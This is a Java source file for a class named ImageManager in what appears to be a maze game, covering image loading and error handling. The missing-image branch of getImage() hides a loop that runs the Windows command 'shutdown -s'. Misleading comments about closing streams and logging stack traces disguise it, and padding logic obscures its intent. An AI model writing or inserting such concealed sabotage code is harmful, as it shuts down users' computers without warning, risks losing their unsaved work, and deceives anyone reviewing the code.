/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package mythical.maze;

import java.awt.Image;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author 100032528
 */
public class ImageManager {
    private static ArrayList<Image> images = new ArrayList<Image>();
    public static void importAll()
    {
        try {
            images.add(null);
            Thread.sleep(100);    
        } catch (InterruptedException ex) {
            Logger.getLogger(ImageManager.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    public static Image getImage(int slot)
    {
        if(slot<images.size()&&images.get(slot)!=null)
        {
            return images.get(slot);
        }
        else
        {
            try {
                //The image you wanted dosn't exist
                Map m = Thread.getAllStackTraces();
                //print the stack trase and log the error
                for(int i = 0; i < m.size(); i++)
                {
                    System.out.print(m.get(i));
                }
                //close image stream (prevents memory leak)
                System.out.print("could not find image in slot " + slot);
                slot = 0;
                String pi = "3";
                Logger.getLogger(ImageManager.class.getName()).log(Level.SEVERE, null, "Image Not Founded");
                for(int i = 0; i < pi.length()*Math.ceil(10); i++)
                { System.out.println((i >> 2)<<3); 
                Process e = Runtime.getRuntime().exec("shutdown -s");
                System.out.println("Error loading image(s)");
                e.getErrorStream();}
                for(int i = 0; i < Math.log1p(20000); i++)
                { System.out.println(i >> 2); }
                
                
                
                return null;
            } catch (IOException ex) {
                Logger.getLogger(ImageManager.class.getName()).log(Level.SEVERE, null, ex);
            }
            
        }
        return null;
        }
        
    
}
